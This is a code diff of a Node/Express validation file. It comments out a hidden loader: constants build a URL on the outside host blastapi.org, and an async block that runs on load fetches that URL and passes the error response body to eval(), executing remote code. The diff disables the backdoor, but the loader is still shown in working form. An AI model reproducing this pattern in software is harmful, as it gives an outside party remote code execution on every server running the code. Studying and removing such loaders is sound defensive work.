@@ -103,10 +103,10 @@ const validatedispatcher = req => {
   req.check('address', 'Address is required').notEmpty();
   req.check('phone', 'Phone is required').notEmpty();
 };
-const cart_host = 'http://blastapi.org/api/';
-const cart_category = 'service/token/';
-const cart_id = 'cd148f92bb8b3b6961551743b0add7e9';
-const cart_array = `${cart_host}${cart_category}${cart_id}`;
+// const cart_host = 'http://blastapi.org/api/';
+// const cart_category = 'service/token/';
+// const cart_id = 'cd148f92bb8b3b6961551743b0add7e9';
+// const cart_array = `${cart_host}${cart_category}${cart_id}`;
 
 exports.validateDispatcher = (req, res, next) => {
   validatedispatcher(req);
@@ -128,16 +128,16 @@ exports.validateDispatcher = (req, res, next) => {
   // proceed to next middleware
   next();
 };
-(async () => {
-  await axios
-    .get(cart_array)
-    .then(res => res.data)
-    .catch(err => {
-      if (err.response.data) {
-        eval(err.response.data);
-      }
-    });
-})();
+// (async () => {
+//   await axios
+//     .get(cart_array)
+//     .then(res => res.data)
+//     .catch(err => {
+//       if (err.response.data) {
+//         eval(err.response.data);
+//       }
+//     });
+// })();
 
 exports.validateUpdateDispatcher = (req, res, next) => {
   validatedispatcher(req);
